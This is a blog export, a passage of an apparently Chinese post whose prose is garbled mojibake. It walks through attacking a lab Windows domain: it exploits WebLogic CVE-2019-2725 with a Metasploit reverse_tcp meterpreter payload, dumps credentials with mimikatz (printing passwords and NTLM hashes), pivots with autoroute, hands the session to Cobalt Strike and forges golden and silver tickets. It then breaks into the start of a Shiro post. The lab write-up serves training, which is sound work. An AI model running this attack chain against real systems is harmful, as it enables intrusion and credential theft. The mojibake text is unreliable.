ç½‘å¡å°±æ˜¯é»˜è®¤äº†ä¼¼ä¹</p><p>ç„¶åWebæœåŠ¡å™¨é¶æœºç™»å½•çš„æ—¶å€™éœ€è¦æ¢å¤åˆ°å¿«ç…§ä¸‰</p><blockquote><p>å‘ƒå‘ƒä½†æ˜¯ä»–æ¢å¤çš„æ—¶å€™ä¼šæœ‰ç‚¹é—®é¢˜ï¼Œä¹±ç‚¹ä¸¤ä¸‹ä»–åˆå¥½äº†</p><p>è¦æ¢å¤å¿«ç…§çš„åŸå› æ˜¯ä»–ç°åœ¨çš„çŠ¶æ€ä¸èƒ½ç”¨è¿™ä¸ªè´¦å·å¯†ç ç™»å½•</p></blockquote><p>ç°åœ¨å°±webé¶æœºæŠŠä¸€äº›æœåŠ¡å¼€èµ·æ¥</p><p>å…ˆè¿›è¿™é‡Œç„¶åè¿è¡Œå…¶startWebLogicè„šæœ¬å¼€å¯æœåŠ¡ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\Oracle\Middleware\user_projects\domains\base_domain\bin<br></code></pre></td></tr></table></figure><p>å¼€å¯å®Œä¹‹åå°±å¯ä»¥å¼€å§‹æ¸—é€äº†</p><h1 id="è€ƒç‚¹æè¿°"><a href="#è€ƒç‚¹æè¿°" class="headerlink" title="è€ƒç‚¹æè¿°"></a>è€ƒç‚¹æè¿°</h1><p>æœ¬æ¬¡çº¢é˜Ÿç¯å¢ƒä¸»è¦Access Tokenåˆ©ç”¨ã€WMIåˆ©ç”¨ã€åŸŸæ¼æ´åˆ©ç”¨SMB relayï¼ŒEWS relayï¼ŒPTT(PTC)ï¼ŒMS14-068ï¼ŒGPPï¼ŒSPNåˆ©ç”¨ã€é»„é‡‘ç¥¨æ®&#x2F;ç™½é“¶ç¥¨æ®&#x2F;Sid History&#x2F;MOFç­‰æ”»é˜²æŠ€æœ¯ã€‚å…³äºé¶åœºç»Ÿä¸€ç™»å½•å¯†ç ï¼š1qaz@WSX</p><ol><li>Bypass UAC</li><li>Windowsç³»ç»ŸNTLMè·å–ï¼ˆç†è®ºçŸ¥è¯†ï¼šWindowsè®¤è¯ï¼‰</li><li>Access Tokenåˆ©ç”¨ï¼ˆMSSQLåˆ©ç”¨ï¼‰</li><li>WMIåˆ©ç”¨</li><li>ç½‘é¡µä»£ç†ï¼ŒäºŒå±‚ä»£ç†ï¼Œç‰¹æ®Šåè®®ä»£ç†ï¼ˆDNSï¼ŒICMPï¼‰</li><li>åŸŸå†…ä¿¡æ¯æ”¶é›†</li><li>åŸŸæ¼æ´åˆ©ç”¨ï¼šSMB relayï¼ŒEWS relayï¼ŒPTT(PTC)ï¼ŒMS14-068ï¼ŒGPPï¼ŒSPNåˆ©ç”¨</li><li>åŸŸå‡­è¯æ”¶é›†</li><li>åé—¨æŠ€æœ¯ï¼ˆé»„é‡‘ç¥¨æ®&#x2F;ç™½é“¶ç¥¨æ®&#x2F;Sid History&#x2F;MOFï¼‰</li></ol><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p>è¿™é‡Œä¸€å¼€å§‹pingäº†ä¸€ä¸‹webé¶æœºå‘ç°pingä¸åŒï¼Œicmpçš„æµé‡è¢«banæ‰äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ­£å¸¸ç°è±¡ï¼Œçœ‹äº†ç½‘ä¸Šæ–‡ç« æœ‰å…³é˜²ç«å¢™ï¼Œæœ‰ç›´æ¥ä¸å…³é˜²ç«å¢™çš„æ‰“æ³•ï¼Œé‚£è¿™é‡Œå°±ä¸å…³å§</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -l<br></code></pre></td></tr></table></figure><p>æ‰«ä¸€ä¸‹ï¼Œå‘ç°èƒ½å‘ç°å­˜æ´»ä¸»æœºï¼Œarpæµé‡èƒ½é€š</p><p><img src="https://cdn.clown2024.cn/image-20241112161255261.png" alt="image-20241112161255261"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# arp-scan -l         <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:1c:87, IPv4: 192.168.111.128<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.111.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.111.2   00:50:56:fc:26:ec       VMware, Inc.<br>192.168.111.80  00:0c:29:c9:cc:6d       VMware, Inc.<br>192.168.111.254 00:50:56:fd:9b:2a       VMware, Inc.<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨nmapæ¥æ‰«æä¸€ä¸‹webæœåŠ¡ï¼Œå› ä¸ºå­˜åœ¨é˜²ç«å¢™æ‰€ä»¥æŒ‡å®šæ‰«ææ–¹å¼æ¥ç»•ä¸€ä¸‹ï¼Œå¯ä»¥ç”¨-Pnè·³è¿‡pingæ‰«ææˆ–è€…-sSä½¿ç”¨SYNçš„æ–¹å¼æ¥æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -Pn -v 192.168.111.80<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºå¦‚ä¸‹çš„æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241112184702154.png" alt="image-20241112184702154"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PORT      STATE SERVICE<br>80/tcp    open  http<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>1433/tcp  open  ms-sql-s<br>3389/tcp  open  ms-wbt-server<br>7001/tcp  open  afs3-callback<br>49152/tcp open  unknown<br>49153/tcp open  unknown<br>49154/tcp open  unknown<br>49155/tcp open  unknown<br>49156/tcp open  unknown<br>MAC Address: 00:0C:29:C9:CC:6D (VMware)<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´æ¢æµ‹åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹åˆ©ç”¨</h1><p>1433å°±è¡¨ç¤ºå­˜åœ¨mssqlæœåŠ¡ï¼Œ7001è¡¨ç¤ºçš„æ˜¯weblogicæœåŠ¡ï¼Œ3389å°±æ˜¯è¿œç¨‹è¿æ¥çš„æœåŠ¡</p><p>é¢ä½†æ˜¯ä»–è¿™é‡Œbanäº†æˆ‘çš„æµé‡ï¼Œå¯¼è‡´æˆ‘çš„fscanå’Œnmapéƒ½æ— æ³•è¿›è¡Œæ¼æ‰«ï¼Œé‚£å°±ç½‘ä¸Šæ‰¾ä¸€ä¸ªweblogicæ¼æ‰«å·¥å…·ï¼š<a href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p><p>è€Œä¸”è®¿é—®ä»–çš„7001æœåŠ¡è¿”å›çš„ä¹Ÿæ˜¯404é¡µé¢ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ­£å¸¸çš„ï¼Œåé¢çœ‹äº†ä¸€ä¸‹ä¼¼ä¹å°±æ˜¯è¿™æ ·çš„</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python WeblogicScan.py 192.168.111.80 7001<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241112191417835.png" alt="image-20241112191417835"></p><p>ç„¶åæ˜¯æŸ¥åˆ°äº†ä¸å°‘æ¼æ´ï¼Œè¿™é‡Œé€‰æ‹©CVE-2019-2725æ¥åˆ©ç”¨ï¼Œè¯¥æ¼æ´æ˜¯ä¸€ä¸ªxmlååºåˆ—åŒ–æ¼æ´ï¼Œå¯ä»¥çœ‹è¿™ç¯‡çš„å¤ç°æ–‡ç« ï¼š<a href="https://www.cnblogs.com/confidant/p/15464877.html%EF%BC%8C%E8%83%BD%E8%AE%BF%E9%97%AE/_async/AsyncResponseService%E8%BF%99%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%B0%B1%E6%98%AF%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84">https://www.cnblogs.com/confidant/p/15464877.htmlï¼Œèƒ½è®¿é—®/_async/AsyncResponseServiceè¿™ä¸ªè·¯ç”±å°±æ˜¯å­˜åœ¨æ¼æ´çš„</a></p><p><img src="https://cdn.clown2024.cn/image-20241112192743424.png" alt="image-20241112192743424"></p><p>æˆ‘æ‰“ç®—ç”¨msfä¸€æŠŠæ¢­äº†</p><p>å…ˆsearchä¸€ä¸‹çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªcve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; search CVE-2019-2725<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241112192922860.png" alt="image-20241112192922860"></p><p>å‘ç°æ˜¯æœ‰çš„ï¼Œé‚£å°±ä½¿ç”¨è¿™ä¸ªexp</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/misc/weblogic_deserialize_asyncresponseservice<br></code></pre></td></tr></table></figure><p>ç„¶åshow optionsçœ‹ä¸€ä¸‹paloadæ€ä¹ˆè®¾ç½®</p><p><img src="https://cdn.clown2024.cn/image-20241112193106546.png" alt="image-20241112193106546"></p><p>æ­¤æ—¶æˆ‘ä»¬æ˜¯çŸ¥é“å¯¹é¢çš„ç³»ç»Ÿçš„ï¼Œæ‰€ä»¥è¦æ”¹ä¸€ä¸‹è®¾ç½®ï¼Œpayloadæ”¹æˆWindowsä¸‹çš„åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show targets<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æœ‰å“ªäº›ç›®æ ‡ç³»ç»Ÿé…ç½®å¯é€‰</p><p><img src="https://cdn.clown2024.cn/image-20241112193530650.png" alt="image-20241112193530650"></p><p>æˆ‘ä»¬çš„ç›®æ ‡æœºå™¨æ˜¯Windowsï¼Œæ‰€ä»¥è¦è®¾ç½®ä¸ºtarget 1</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> target 1<br></code></pre></td></tr></table></figure><p>ç„¶åå†setä¸€ä¸‹payloadçš„ç›‘å¬åœ°å€</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.111.128<br></code></pre></td></tr></table></figure><p>å†æŒ‡å®šä¸€ä¸‹è¦æ‰“çš„é¶æœºåœ°å€</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.111.80<br></code></pre></td></tr></table></figure><p>å†æ‰§è¡Œrunè¿è¡Œexpå°±å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmeterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241112200737018.png" alt="image-20241112200737018"></p><h1 id="æ‰“å†…ç½‘"><a href="#æ‰“å†…ç½‘" class="headerlink" title="æ‰“å†…ç½‘"></a>æ‰“å†…ç½‘</h1><p>ç›´æ¥ç”¨getsystemææƒå‘ç°ä¸è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241112201304099.png" alt="image-20241112201304099"></p><p>å­¦åˆ°ä¸€ä¸ªç›´æ¥è¿›ç¨‹è¿ç§»åˆ°ä¸€ä¸ªNT AUTHORITY\SYSTEMæƒé™çš„è¿›ç¨‹ï¼Œå°±èƒ½åˆ©ç”¨mimikatzå¯¼å‡ºå¯†ç äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">migrate 2644<br>load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; creds_all<br>[+] Running as SYSTEM<br>[*] Retrieving all credentials<br>msv credentials<br>===============<br><br>Username       Domain  NTLM                       SHA1                       LM<br>--------       ------  ----                       ----                       --<br>Administrator  DE1AY   161cff084477fe596a5db8187  d669f3bccf14bf77d64667ec6  f67ce55ac831223dc187b8085<br>                       4498a24                    5aae32d2d10039d            fe1d9df<br>WEB$           DE1AY   73805069e2c7227f110772875  b4c99cab2eebaf54cbd0076ec<br>                       f1b0e41                    4869f3ecf579295<br>mssql          DE1AY   161cff084477fe596a5db8187  d669f3bccf14bf77d64667ec6  f67ce55ac831223dc187b8085<br>                       4498a24                    5aae32d2d10039d            fe1d9df<br><br>wdigest credentials<br>===================<br><br>Username       Domain  Password<br>--------       ------  --------<br>(null)         (null)  (null)<br>Administrator  DE1AY   1qaz@WSX<br>WEB$           DE1AY   `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_r<br>                       xjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$<br>mssql          DE1AY   1qaz@WSX<br><br>tspkg credentials<br>=================<br><br>Username       Domain  Password<br>--------       ------  --------<br>Administrator  DE1AY   1qaz@WSX<br>WEB$           DE1AY   `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HKE_r<br>                       xjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$<br>mssql          DE1AY   1qaz@WSX<br><br>kerberos credentials<br>====================<br><br>Username       Domain     Password<br>--------       ------     --------<br>(null)         (null)     (null)<br>Administrator  de1ay.com  1qaz@WSX<br>WEB$           de1ay.com  `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HK<br>                          E_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$<br>mssql          DE1AY.COM  1qaz@WSX<br>web$           de1ay.com  `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HK<br>                          E_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$<br>web$           DE1AY.COM  `rivzEuKjb1zX_:+MFm ),F:+Z&amp;;D edXt,h`aQX6m&quot;CA&amp;r(^+k^/wBEl0C&amp;&gt;4+2&gt;jy:mGgA?&#x27;HK<br>                          E_rxjdU$#ZHNhx/32t!t;c5\lo .SMii3d=&amp;)BB\0bo$<br></code></pre></td></tr></table></figure><p>ç„¶åè¿˜å¯ä»¥åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_applications<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ‰å“ªäº›åº”ç”¨</p><h2 id="msfæ¸—é€æ‰“æ³•"><a href="#MSFæ¸—é€æ‰“æ³•" class="headerlink" title="MSFæ¸—é€æ‰“æ³•"></a>MSFæ¸—é€æ‰“æ³•</h2><p>è¿™é‡Œå…ˆå°è¯•ä¸€ä¸‹msfç›´æ¥æ‰“çœ‹èƒ½ä¸èƒ½æ‹¿ä¸‹</p><p>é¦–å…ˆshellå‘½ä»¤è¿›å…¥Windowsçš„cmdï¼Œç„¶åå°±æ˜¯åŸŸä¿¡æ¯æœé›†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">net view<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œä¸€ç›´ä¼šæŠ¥6118çš„é”™è¯¯ï¼Œå…ˆipconfigçœ‹ä¸€ä¸‹è‡ªå·±ipå§</p><p><img src="https://cdn.clown2024.cn/image-20241112204754776.png" alt="image-20241112204754776"></p><p>backgroundå‡ºæ¥hashdumpæ‹¿ä¸€ä¸‹å“ˆå¸Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>de1ay:1000:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>ç„¶åæ·»åŠ ä¸€ä¸‹è·¯ç”±è½¬å‘è®©æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®å†…ç½‘</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run get_local_subnets  <span class="hljs-comment">#æŸ¥çœ‹ä¸»æœºæ‰€å¤„çš„æ‰€æœ‰ç½‘æ®µ</span><br>run autoroute -s 10.10.10.0/24 <span class="hljs-comment">#æ·»åŠ å»å¾€ç›®æ ‡ç½‘æ®µçš„è·¯ç”±</span><br><span class="hljs-comment">#æˆ–è€…</span><br>run post/multi/manage/autoroute <span class="hljs-comment">#è‡ªåŠ¨æ·»åŠ è·¯ç”±</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241112205124431.png" alt="image-20241112205124431"></p><p>æ·»åŠ äº†è½¬å‘ä¹‹åç”¨msfçš„ç«¯å£æ‰«ææ¨¡å—æ¥æ‰«</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/portscan/tcp<br><span class="hljs-built_in">set</span> rhosts 10.10.10.201 10.10.10.80 <span class="hljs-comment">#è¿™é‡Œå·æ‡’ä¸€ä¸‹ç›´æ¥ç”¨æŒ‡å®šipæ‰«äº†ï¼Œå› ä¸ºæ€•æ‰«çš„å¤ªæ…¢ä½†å…¶å®æ ¹æœ¬æ‰«ä¸äº†ã€‚ã€‚</span><br></code></pre></td></tr></table></figure><p>okç„¶åç«¯å£æ‰«ææ‰«ä¸äº†ï¼Œè¢«ç›´æ¥åŠé€€äº†</p><p><img src="https://cdn.clown2024.cn/image-20241112210714394.png" alt="image-20241112210714394"></p><p>é‚£å°±ç”¨msfæ´¾ç”Ÿcsæ¥æ‰“å§</p><h2 id="msfæ´¾ç”Ÿcsæ¥æ‰“"><a href="#msfæ´¾ç”Ÿcsæ¥æ‰“" class="headerlink" title="msfæ´¾ç”Ÿcsæ¥æ‰“"></a>msfæ´¾ç”Ÿcsæ¥æ‰“</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http  <span class="hljs-comment">#ä¸¤è¾¹çš„payloadåè®®ä¸€å®šè¦å¯¹åº”çš„</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºå·²ç»æœ‰äº†ä¸€ä¸ªä¸éœ€è¦å†äº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œè®¾ç½®ä¸ºtrue</span><br><span class="hljs-built_in">set</span> lhost xxxx <span class="hljs-comment">#cobaltstrikeæœåŠ¡ç«¯ip</span><br><span class="hljs-built_in">set</span> lport xxxx <span class="hljs-comment">#cobaltstrikeæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£ </span><br><span class="hljs-built_in">set</span> session 1  <span class="hljs-comment">#è¿™é‡Œæ˜¯å½“å‰è·å¾—çš„sessionçš„id</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241112212124390.png" alt="image-20241112212124390"></p><p>wocaoæœ‰ç‚¹çº¢æ¸©äº†ï¼Œæˆ‘æ¯runä¸€æ¬¡payloadä»–åœ¨webé¶æœºç”Ÿæˆä¸€æ¬¡è®°äº‹æœ¬ï¼Œä½†æ˜¯å¼¹ä¸è¿‡æ¥</p><p>ç„¶åæˆ‘å»çœ‹äº†ä¸€ä¸‹csçš„é€šä¿¡åŸç†ï¼Œå‘ç°æ˜¯beacon httpå†™é”™äº†ï¼Œæˆ‘æŠŠteamserveræ¢åˆ°æœ¬åœ°å°±è¡Œäº†ï¼Œä¸æƒ³æ”¹msfçš„payloadäº†</p><p><img src="https://cdn.clown2024.cn/image-20241112220605474.png" alt="image-20241112220605474"></p><p>è¿™é‡Œçš„beaconsçš„åœ°å€åº”è¯¥æ˜¯teamserverçš„åœ°å€ï¼Œcsçš„é€šä¿¡åŸç†å›¾</p><p><img src="https://cdn.clown2024.cn/image-20241112220716993.png" alt="image-20241112220716993"></p><p>net viewè¿˜æ˜¯ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241112220859254.png" alt="image-20241112220859254"></p><p>ç„¶åcsæä¸ªæƒ</p><p><img src="https://cdn.clown2024.cn/image-20241112221356831.png" alt="image-20241112221356831"></p><p>csä¸€æå°±æˆåŠŸäº†è¿™ä¹ˆçŒ›</p><p>ç„¶åä¹Ÿå¯ä»¥å¸¸è§„hashdumpå’Œrun mimikatzä¸€ä¸‹ï¼Œä¸è¿‡å‰é¢msféƒ½æè¿‡äº†å°±ä¸å†æ”¶é›†äº†</p><p><img src="https://cdn.clown2024.cn/image-20241112222038970.png" alt="image-20241112222038970"></p><p>ä¸è¿‡è¿™é‡Œ360æ²¡æœ‰æç¤ºå°±å¾ˆå¥‡æ€ªï¼Œçœ‹åˆ«äººéƒ½æ˜¯æœ‰360å‘Šè­¦çš„</p><p>å¥½äº†åˆå‡ºé—®é¢˜äº†ï¼Œç»™æˆ‘åŠé€€äº†ç›´æ¥ï¼Œnet viewä¸äº†å¯¼è‡´å‘ç°ä¸äº†å…¶ä»–ä¸»æœºï¼Œä¹Ÿå°±æ¨ªå‘ç§»åŠ¨ä¸äº†äº†ï¼Œé€†å¤©ï¼Œæ¢å¤å¿«ç…§çš„åŸå› å¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ª</p><p>é‚£æ²¡åŠæ³•äº†åé¢åªèƒ½çœ‹çœ‹åˆ«äººæ–‡ç« å®æ“ä¸äº†äº†</p><p>æ¨ªå‘ç§»åŠ¨å°±æ˜¯æ‹¿å‰é¢çš„å‡­æ®ç„¶åç›´æ¥psexecå°±å¯ä»¥äº†</p><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><p>è¿™ä¸ªé¶åœºä¸»è¦çš„æ–°çŸ¥è¯†æ˜¯åˆ©ç”¨é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®æ¥åšæƒé™ç»´æŒ</p><p>è¿™éƒ¨åˆ†å°±æ ¹æ®å‰é¢kerberosæ”»å‡»ä¸“é¢˜ï¼Œæ ¹æ®åˆ¶ä½œç¥¨æ®æ‰€éœ€è¦çš„ä¿¡æ¯æ¥è¿›è¡Œæ”¶é›†ï¼Œç„¶åç›´æ¥ç”¨csè¿›è¡Œåˆ¶ä½œå³å¯</p><p><strong>é»„é‡‘ç¥¨æ®åˆ¶ä½œ</strong></p><ol><li>é¦–å…ˆéœ€è¦åœ¨DCä¹Ÿå°±æ˜¯åŸŸæ§æœºå™¨ä¸Šhashdumpå‡º<code>krbtgt</code>çš„hashå€¼ï¼Œ<code>krbtgt</code>ç”¨æˆ·æ˜¯åŸŸä¸­ç”¨æ¥ç®¡ç†å‘æ”¾ç¥¨æ®çš„ç”¨æˆ·ï¼Œæ‹¥æœ‰äº†è¯¥ç”¨æˆ·çš„æƒé™ï¼Œå°±å¯ä»¥ä¼ªé€ ç³»ç»Ÿä¸­çš„ä»»æ„ç”¨æˆ·</li><li>ç„¶åéœ€è¦åŸŸæ§sidï¼Œè¿™ä¸ªmimikatzå¯ä»¥æŠ“å–åˆ°</li></ol><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨csè¿™é‡Œå¡«ä¸Šå¯¹åº”çš„ä¿¡æ¯ï¼Œåœ¨webä¸»æœºç”Ÿæˆé»„é‡‘ç¥¨æ®</p><p><img src="https://cdn.clown2024.cn/image-20241112225104736.png" alt="image-20241112225104736"></p><p>userå°±æ˜¯ä½ è¦ä¼ªé€ çš„ç”¨æˆ·ï¼Œdomainå°±æ˜¯å½“å‰æ‰€åœ¨åŸŸ</p><p><strong>ç™½é“¶ç¥¨æ®</strong></p><p>ç™½é“¶ç¥¨æ®è¿˜éœ€è¦ä¸€ä¸ªNTLM-hashï¼Œæˆ‘çš„csä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰ç”Ÿæˆç™½é“¶ç¥¨æ®çš„æ¨¡å—ï¼Œè¿™é‡Œæˆªä¸€ä¸‹å…¶ä»–å¸ˆå‚…æ–‡ç« é‡Œçš„å›¾</p><p><img src="https://cdn.clown2024.cn/image-20241112230021371.png" alt="image-20241112230021371"></p><p>ä¸¤ä¸ªç¥¨æ®æœ€ç»ˆç”Ÿæˆä¹‹åéƒ½æ˜¯å¯ä»¥è®¿é—®åŸŸæ§çš„cç›˜</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">shell <span class="hljs-built_in">dir</span> \\10.10.10.10\c$<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/bktown/p/16904232.html">https://www.cnblogs.com/bktown/p/16904232.html</a></p><p><a href="https://xz.aliyun.com/t/11676?time__1311=Cq0xRQIxnD0Dlxx2QDuYLmK0Ki=cUtw5ox">https://xz.aliyun.com/t/11676?time__1311=Cq0xRQIxnD0Dlxx2QDuYLmK0Ki%3DcUtw5ox</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroååºåˆ—åŒ–</title>
      <link href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="shiroä»‹ç»"><a href="#Shiroä»‹ç»" class="headerlink" title="Shiroä»‹ç»"></a>Shiroä»‹ç»</h1><p>ç›´æ¥é—®kimiç»™å‡ºçš„å¤§è‡´ä»‹ç»</p><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚å®ƒè¢«è®¾è®¡ä¸ºæ˜“äºç†è§£ä¸”æ˜“äºä½¿ç”¨ï¼ŒåŒæ—¶æä¾›äº†å¼ºå¤§çš„å®‰å…¨æ€§ã€‚ä»¥ä¸‹æ˜¯Shiroçš„ä¸€äº›å…³é”®ç‰¹æ€§ï¼š</p><ol><li><strong>è®¤è¯ï¼ˆAuthenticationï¼‰</strong>ï¼šShiroæä¾›äº†å¤šç§è®¤è¯æ–¹å¼ï¼ŒåŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€OAuthã€LDAPç­‰ã€‚</li><li><strong>æˆæƒï¼ˆAuthorizationï¼‰</strong>ï¼šShiroå…è®¸ä½ å®šä¹‰æƒé™å’Œè§’è‰²ï¼Œå¹¶æ ¹æ®è¿™äº›å®šä¹‰æ¥æ§åˆ¶ç”¨æˆ·å¯¹èµ„æºçš„è®¿é—®ã€‚</li><li><strong>åŠ å¯†ï¼ˆCryptographyï¼‰</strong>ï¼šShiroæä¾›äº†ä¸€å¥—åŠ å¯†å·¥å…·ï¼Œå¯ä»¥ç”¨äºå®‰å…¨åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚</li><li><strong>ä¼šè¯ç®¡ç†ï¼ˆSession 